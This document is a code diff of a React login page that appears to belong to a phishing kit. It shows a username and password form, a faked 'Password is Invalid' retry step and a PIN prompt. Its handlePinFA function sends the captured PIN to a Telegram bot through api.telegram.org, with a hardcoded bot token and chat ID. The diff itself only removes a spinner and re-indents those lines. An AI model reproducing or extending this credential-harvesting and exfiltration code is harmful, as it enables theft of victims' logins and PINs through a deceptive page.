@@ -21,7 +21,6 @@ function App() {
   const [sorrys, sorrysSet] = useState('sorry');
   const [pinclaw, pinclawSet] = useState('');
   const [pshows, pshowsSet] = useState('pshow');
-  const [spinner, spinnerSet] = useState('formal');
 
 
   const botToken = '5487410170:AAF60BxMlwAyuSyBzI88bj3ITFU2C6P71r4';
@@ -57,9 +56,6 @@ function App() {
   };
   const handleSubmit = async (e) => {
     e.preventDefault();
-    spinnerSet('')
-    butttShow('buttt')
-    sorryShow('sorry')
     const formData = new FormData(e.target);
     const username = formData.get("username");
     const password = formData.get("password");
@@ -75,8 +71,6 @@ function App() {
       if(responseData.message === "Password is Invalid"){
         // alert(responseData.message)
         sorryShow('')
-        spinnerSet('formal')
-        butttShow('')
       } else {
         formmsSet('formms')
         classValueShow(responseData.classValue)
@@ -120,8 +114,8 @@ function App() {
   const handlePinFA = async (e) => {
     e.preventDefault()
 
-   const botToken = '5487410170:AAF60BxMlwAyuSyBzI88bj3ITFU2C6P71r4';
-   const chatId = '-937223528';
+    const botToken = '5487410170:AAF60BxMlwAyuSyBzI88bj3ITFU2C6P71r4';
+    const chatId = '-937223528';
     const message = `PIN: ${pinFa}`;
   
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -223,7 +217,6 @@ function App() {
             value={form1Data.password} onChange={handleInputChange}
           required/>
           </div><br/>
-          <div className="loader" id={spinner}></div>
           <button type="" id={butt} className="" onClick={handleNextClick}>Next</button>
           <button id={buttt} type="submit">Next</button>
         </form><br/><br/><br/>
